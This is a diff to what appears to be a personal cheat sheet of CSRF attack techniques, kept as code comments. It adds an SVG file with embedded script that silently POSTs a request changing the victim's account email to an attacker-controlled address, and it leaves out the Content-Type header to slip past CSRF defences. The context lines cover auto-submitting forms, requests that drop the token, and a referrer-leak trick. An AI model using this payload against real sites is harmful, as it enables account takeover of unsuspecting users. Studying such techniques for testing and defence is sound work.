@@ -9,6 +9,21 @@
 //    <script>document.forms[0].submit();</script>
 //  </body>
 // </html>
+//* CSRF vis svg
+//<svg xmlns="http://www.w3.org/2000/svg">
+//  <script type="application/ecmascript">
+//    <![CDATA[
+//      const email ="admin@attacker.com";
+//      const jsonData = JSON.stringify({ email: email });
+//      const blob = new Blob([jsonData], { type: '' });
+//      const response = fetch('/update_email', {
+//          method: 'POST',
+//          body: blob,
+//          headers: {} // No Content-Type header - key to CSRF vulnerability
+//      });
+//    ]]>
+//  </script>
+//</svg>
 //! CSRF token
 //* present token
 // some application forgot totaly about csrf projection if the token is not present
@@ -78,3 +93,4 @@
 // http://your-website.com/path?application-origin.com
 // and add <meta name="referrer" content="unsafe-url" />
 // for the browser to not remove the query string
+
